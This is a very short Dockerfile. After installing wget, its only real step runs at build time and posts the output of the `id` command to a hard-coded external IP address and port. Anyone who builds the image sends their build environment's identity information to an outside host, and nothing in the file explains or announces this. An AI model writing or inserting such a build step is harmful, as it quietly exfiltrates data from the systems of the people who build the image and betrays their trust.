FROM ubuntu:18.04
RUN apt update && apt install wget -y
RUN /usr/bin/wget --user-agent=test --post-data=`id` 104.236.13.229:55555 --timeout 1